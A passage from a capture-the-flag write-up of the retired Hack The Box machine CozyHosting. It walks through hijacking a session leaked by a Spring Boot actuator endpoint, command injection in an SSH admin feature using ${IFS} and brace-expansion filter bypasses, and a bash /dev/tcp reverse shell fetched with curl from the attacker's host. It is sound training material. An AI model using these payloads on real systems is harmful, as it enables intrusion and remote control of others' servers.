HTB: CozyHosting
================

![CozyHosting](https://0xdf.gitlab.io/img/cozyhosting-cover.png)

CozyHosting is a web hosting company with a website running on Java Spring Boot. I’ll find a Spring Boot Actuator path that leaks the session id of a logged in user, and use that to get access to the site. Once there, I’ll find command injection in a admin feature to get a foothold. I’ll pull database creds from the Java Jar file and use them to get the admin’s hash on the website
from Postgres, which is also the user’s password on the box. From there, I’ll abuse sudo ssh with the ProxyCommand option to get root.

## Box Info

Name[CozyHosting](https://www.hackthebox.com/machines/cozyhosting) [![CozyHosting](https://0xdf.gitlab.io/icons/box-cozyhosting.png)](https://www.hackthebox.com/machines/cozyhosting)

[Play on HackTheBox](https://www.hackthebox.com/machines/cozyhosting)Release Date[02 Sep 2023](https://twitter.com/hackthebox_eu/status/1697257963344560187)Retire Date02 Mar 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsEasy \[20\]Rated Difficulty![Rated difficulty for CozyHosting](https://0xdf.gitlab.io/img/cozyhosting-diff.png)Radar Graph![Radar chart for CozyHosting](https://0xdf.gitlab.io/img/cozyhosting-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:11:50 [![szymex73](https://www.hackthebox.eu/badge/image/139466)](https://app.hackthebox.com/users/139466)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)00:12:35 [![szymex73](https://www.hackthebox.eu/badge/image/139466)](https://app.hackthebox.com/users/139466)

Creator[![commandercool](https://www.hackthebox.eu/badge/image/1005191)](https://app.hackthebox.com/users/1005191)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.230
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 18:51 EST
Nmap scan report for 10.10.11.230
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.230
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 18:52 EST
Nmap scan report for 10.10.11.230
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The HTTP server on 80 is redirecting to `cozyhosting.htb`. Given the use of host based routing, I’ll fuzz for other subdomains that reply differently, but not find any.

### Website - TCP 80

#### Site

The site is for a web hosting company:

![image-20240226190405235](https://0xdf.gitlab.io/img/image-20240226190405235.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

All of the links on the page except for the “Login” button at the top right go to other places on the page.

The login page asks for username and password:

![image-20240227062335313](https://0xdf.gitlab.io/img/image-20240227062335313.png)

Some simple guesses like admin / admin don’t work.

#### Tech Stack

The HTTP response headers show nginx as the web server:

```
HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 27 Feb 2024 00:02:38 GMT
Content-Type: text/html;charset=UTF-8
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US
Content-Length: 12706

```

There are some other less common headers, but nothing that identifies what’s in use. When I try to log in, even on failure, there’s a cookie set:

```
HTTP/1.1 302
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 27 Feb 2024 11:23:38 GMT
Content-Length: 0
Location: http://cozyhosting.htb/login?error
Connection: close
Set-Cookie: JSESSIONID=1557523182BEB62C96303F5C105972D5; Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

```

`JSESSIONID` suggests a Java-based web framework.

The 404 page is interesting:

![image-20240227064238510](https://0xdf.gitlab.io/img/image-20240227064238510.png)

That matches the default error page for Java Spring Boot:

![image-20240227064410252](https://0xdf.gitlab.io/img/image-20240227064410252.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```
oxdf@hacky$ feroxbuster -u http://cozyhosting.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       97l      196w     4431c http://cozyhosting.htb/login
204      GET        0l        0w        0c http://cozyhosting.htb/logout
401      GET        1l        1w       97c http://cozyhosting.htb/admin
200      GET      285l      745w    12706c http://cozyhosting.htb/
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET      285l      745w    12706c http://cozyhosting.htb/index
400      GET        1l       32w      435c http://cozyhosting.htb/[
400      GET        1l       32w      435c http://cozyhosting.htb/plain]
400      GET        1l       32w      435c http://cozyhosting.htb/]
400      GET        1l       32w      435c http://cozyhosting.htb/quote]
400      GET        1l       32w      435c http://cozyhosting.htb/extension]
400      GET        1l       32w      435c http://cozyhosting.htb/[0-9]
[####################] - 2m     30000/30000   0s      found:12      errors:0
[####################] - 2m     30000/30000   226/s   http://cozyhosting.htb/

```

There’s a `/admin` page that requires auth.

`/error` shows a similar error to the 404 error:

![image-20240227064629685](https://0xdf.gitlab.io/img/image-20240227064629685.png)

[SecLists](https://github.com/danielmiessler/SecLists) has a specific wordlist for Springboot. I’ll run `feroxbuster` again with this list:

```
oxdf@hacky$ feroxbuster -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/spring-boot.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/tz
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/language
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/pwd
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/hostname
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l        1w       95c http://cozyhosting.htb/actuator/sessions
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/spring.jmx.enabled
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
[####################] - 2s       113/113     0s      found:13      errors:0
[####################] - 1s       113/113     81/s    http://cozyhosting.htb/

```

The `/actuator` path is interesting, and everything else is a part of that.

#### Actuators

Spring Boot includes a set of features that are designed for monitoring, managing, and debugging applications known as actuators. `/actuator/mapping` gives a detailed list about the application, including not only the actuators, but also other endpoints for the application:

```
oxdf@hacky$ curl -s http://cozyhosting.htb/actuator/mappings | jq .
{
  "contexts": {
    "application": {
      "mappings": {
        "dispatcherServlets": {
          "dispatcherServlet": [
            {
              "handler": "Actuator web endpoint 'beans'",
              "predicate": "{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/beans"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'health-path'",
              "predicate": "{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/health/**"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'mappings'",
              "predicate": "{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/mappings"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator root web endpoint",
              "predicate": "{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping.WebMvcLinksHandler",
                  "name": "links",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Ljava/util/Map;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'env'",
              "predicate": "{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/env"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'env-toMatch'",
              "predicate": "{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/env/{toMatch}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'sessions'",
              "predicate": "{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/sessions"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "Actuator web endpoint 'health'",
              "predicate": "{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/health"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)",
              "predicate": "{ [/error], produces [text/html]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController",
                  "name": "errorHtml",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Lorg/springframework/web/servlet/ModelAndView;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [],
                  "patterns": [
                    "/error"
                  ],
                  "produces": [
                    {
                      "mediaType": "text/html",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "handler": "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",
              "predicate": "{POST [/executessh]}",
              "details": {
                "handlerMethod": {
                  "className": "htb.cloudhosting.compliance.ComplianceService",
                  "name": "executeOverSsh",
                  "descriptor": "(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "POST"
                  ],
                  "params": [],
                  "patterns": [
                    "/executessh"
                  ],
                  "produces": []
                }
              }
            },
            {
              "handler": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)",
              "predicate": "{ [/error]}",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController",
                  "name": "error",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;)Lorg/springframework/http/ResponseEntity;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [],
                  "patterns": [
                    "/error"
                  ],
                  "produces": []
                }
              }
            },
            {
              "handler": "ParameterizableViewController [view=\"admin\"]",
              "predicate": "/admin"
            },
            {
              "handler": "ParameterizableViewController [view=\"addhost\"]",
              "predicate": "/addhost"
            },
            {
              "handler": "ParameterizableViewController [view=\"index\"]",
              "predicate": "/index"
            },
            {
              "handler": "ParameterizableViewController [view=\"login\"]",
              "predicate": "/login"
            },
            {
              "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]",
              "predicate": "/webjars/**"
            },
            {
              "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]",
              "predicate": "/**"
            }
          ]
        },
        "servletFilters": [
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "requestContextFilter",
            "className": "org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "Tomcat WebSocket (JSR356) Filter",
            "className": "org.apache.tomcat.websocket.server.WsFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "serverHttpObservationFilter",
            "className": "org.springframework.web.filter.ServerHttpObservationFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "characterEncodingFilter",
            "className": "org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "springSecurityFilterChain",
            "className": "org.springframework.boot.web.servlet.DelegatingFilterProxyRegistrationBean$1"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "formContentFilter",
            "className": "org.springframework.boot.web.servlet.filter.OrderedFormContentFilter"
          }
        ],
        "servlets": [
          {
            "mappings": [
              "/"
            ],
            "name": "dispatcherServlet",
            "className": "org.springframework.web.servlet.DispatcherServlet"
          }
        ]
      }
    }
  }
}

```

That’s a ton of data, but with some `jq` foo I can get a nice list:

```
oxdf@hacky$ curl -s http://cozyhosting.htb/actuator/mappings | jq -c '.contexts.application.mappings.dispatcherServlets
.dispatcherServlet | .[] | [.handler, .predicate]'
["Actuator web endpoint 'beans'","{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'health-path'","{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'mappings'","{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator root web endpoint","{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'env'","{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'env-toMatch'","{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'sessions'","{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'health'","{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)","{ [/error], produces [text/html]}"]
["htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)","{POST [/executessh]}"]
["org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)","{ [/error]}"]
["ParameterizableViewController [view=\"admin\"]","/admin"]
["ParameterizableViewController [view=\"addhost\"]","/addhost"]
["ParameterizableViewController [view=\"index\"]","/index"]
["ParameterizableViewController [view=\"login\"]","/login"]
["ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]","/webjars/**"]
["ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]","/**"]

```

`/addhost` and `/executessh`, but I’ll come back to those.

`/actuator/env` lead what looks like some configuration values, but a lot of the interesitng ones (and some not interesting ones) are masked, shown as strings of “\*”.

`/actuator/sessions` is immediately interesting:

```
oxdf@hacky$ curl -s http://cozyhosting.htb/actuator/sessions | jq .
{
  "1AB37C626597DADB7425C1273F7DA678": "kanderson"
}

```

If try and fail to log in a few times, more sessions show up:

```
oxdf@hacky$ curl -s http://cozyhosting.htb/actuator/sessions | jq .
{
  "EEE571008BF31ADB2E904F4E8CBF5ABB": "UNAUTHORIZED",
  "E1CE43B04CC6C958A7496877E331256D": "UNAUTHORIZED",
  "2926B07C6C6B8CB0B92A5AE5DF5AE2B6": "UNAUTHORIZED",
  "B3C02C5C13A99CCEFC3AF469D28374C9": "UNAUTHORIZED",
  "C987ACE5C53875AE151372328A544FAF": "kanderson"
}

```

## Shell as app

### Session Stealing

I’ll go into Firefox dev tools, under Storage -> Cookies and replace the value for `JSESSIONID` with the kandersons user’s cookie.

![image-20240227102346639](https://0xdf.gitlab.io/img/image-20240227102346639.png)

Now when I refresh `/login` or visit `/admin`, there’s a panel and I’m authenticated as K. Anderson:

![image-20240227102421433](https://0xdf.gitlab.io/img/image-20240227102421433.png)

### Automatic Patching

The interesting part of the page is the form at the bottom. If I submit my IP as the hostname and 0xdf as the username, it returns an error after short wait:

![image-20240227102851972](https://0xdf.gitlab.io/img/image-20240227102851972.png)

This is a POST request to `/executessh` (noticed above).

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin?error=ssh:%20connect%20to%20host%2010.10.14.6%20port%2022:%20Connection%20timed%20out
Cookie: JSESSIONID=C987ACE5C53875AE151372328A544FAF
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

host=10.10.14.6&username=0xdf

```

I’ll try that again with Wireshark running, but there’s no connection to my host. There must be a firewall blocking outbound connections.

I’ll try having it target `localhost`. It’s a different error:

![image-20240227103103332](https://0xdf.gitlab.io/img/image-20240227103103332.png)

### Command Injection

Based on the error message, and that it said it’s using a private key, it seems likely that the server is running `ssh -i [key] [username]@[hostname]` to connect. If that’s the case, I can test for command injection vulnerabilities. My first attempt returns “Invalid hostname!”:

![image-20240227103427316](https://0xdf.gitlab.io/img/image-20240227103427316.png)

This indicates that there’s some kind of filtering going on. I’ll try `&` and `|` instead of `;`, but the same result. Before fuzzing to see what are the banned characters, I’ll try in the username field. It’s a different error message:

![image-20240227103935226](https://0xdf.gitlab.io/img/image-20240227103935226.png)

There are a couple ways to get whitespace without spaces in a Linux terminal context. I’ll use `${IFS}` as a Bash environment variable that is a space, and it kind of works:

![image-20240227104221635](https://0xdf.gitlab.io/img/image-20240227104221635.png)

It’s making the command:

```
ssh -i [key] 0xdf;ping${IFS}-c${IFS}1${IFS}10.10.14.6@localhost

```

It’s interesting that it handles 0xdf as `0.0.0.223`, but not important. It’s failing SSH, and then trying to ping `10.10.14.6@localhost`. So my command is a bit broken, but it’s working. I’ll add a comment `#` to the end:

![image-20240227105830608](https://0xdf.gitlab.io/img/image-20240227105830608.png)

It shows failure, but at my box with `tcpdump`, I see a ICMP packet:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:57:55.045594 IP 10.10.11.230 > 10.10.14.6: ICMP echo request, id 5, seq 1, length 64
10:57:55.045627 IP 10.10.14.6 > 10.10.11.230: ICMP echo reply, id 5, seq 1, length 64

```

That’s command injection!

Alternatively, I can also get spaces added in Bash with [brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html), so the username `0xdf;{ping,-c,1,10.10.14.6};#` works as well, making:

```
ssh -i [key] 0xdf;{ping,-c,1,10.10.14.6};#@localhost

```

Which expands to:

```
ssh -i [key] 0xdf;ping -c 1 10.10.14.6;#@localhost

```

### Shell

Java applications can be very tricky about piping and special characters in processes, so I’ll go the simple route of writing a Bash script to disk and then running it. I’ll create a reverse shell script locally called `rev.sh`:

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll switch my requests over to Burp Repeater for quicker sending. I’ll use `curl` to fetch `rev.sh` from my server:

![image-20240227110456686](https://0xdf.gitlab.io/img/image-20240227110456686.png)

It works:

```
oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.230 - - [27/Feb/2024 11:05:08] "GET /rev.sh HTTP/1.1" 200 -

```

But there’s an error in the response:

![image-20240227110642749](https://0xdf.gitlab.io/img/image-20240227110642749.png)

If I move to `/tmp/rev.sh`, it seems to work:

![image-20240227110742338](https://0xdf.gitlab.io/img/image-20240227110742338.png)

I’ll submit another request to run `bash /tmp/rev.sh`:

![image-20240227110809092](https://0xdf.gitlab.io/img/image-20240227110809092.png)

The request just hangs, but at my listening `nc`, there’s a shell:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.230 51348
bash: cannot set terminal process group (1063): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$

```

I’ll upgrade my shell using [the script technique](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
app@cozyhosting:/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
app@cozyhosting:/app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
app@cozyhosting:/app$

```

## Shell as josh

### Enumeration

#### Web Application

The web application is running out of `/app`, which container a Java Jar file:

```
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar

```

That Jar is running:

```
app@cozyhosting:/app$ ps auxww | grep cloudhosting
app         1063  0.7 14.9 3672520 599428 ?      Ssl  Feb26   7:37 /usr/bin/java -jar cloudhosting-0.0.1.jar

```

That process is listening on 8080:

```
app@cozyhosting:/app$ netstat -tnlp | grep 1063
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1063/java

```

And I can see that nginx is forwarding traffic for `cozyhosting.htb` to port 8080:

```
app@cozyhosting:/app$ cat /etc/nginx/sites-enabled/default
server {
